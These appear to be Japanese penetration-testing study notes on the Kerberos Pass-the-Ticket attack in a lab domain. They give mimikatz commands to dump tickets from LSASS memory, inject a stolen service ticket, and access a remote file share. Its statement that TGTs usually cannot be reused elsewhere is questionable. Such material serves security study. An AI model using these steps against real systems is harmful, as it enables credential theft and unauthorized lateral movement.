# 概要
Pass the Ticket攻撃は、TGSを悪用します。TGSはネットワーク上の他の場所にエクスポートされ、再挿入された後、特定のサービスへの認証に使用されます。さらに、サービスチケットが現在のユーザーに属している場合、管理者権限は必要ありません。
TGTは通常、作成されたユーザーセッションに関連付けられており、他の場所で再利用することはできません。一方、サービスチケット（TGS）は多くの場合エクスポートしてシステム間で再利用できるため、より柔軟性があります。

# メモリ内のクレデンシャルをエクスポート
メモリ内のLSASS プロセス空間を解析して TGT/TGS を検索し、それを kirbi mimikatz 形式でディスクに保存

```powershell
.\mimikatz.exe
```

```mimikatz
privilege::debug
sekurlsa::tickets /export
```

```powershell
dir *.kirbi
```
![](../../../assets/images/Pasted%20image%2020260502093210.png)

```mimikatz
kerberos::ptt [0;264a32]-0-0-40810000-dave@cifs-web04.kirbi
```
![](../../../assets/images/Pasted%20image%2020260502093630.png)

```powershell
klist
```
![](11_Active_Directory/03_横展開/assets/images/Pasted%20image%2020250819232715.png)
- Client: dave @ CORP.COM
 - Server: cifs/web04 @ CORP.COM
```poershell
ls \\web04\backup
```
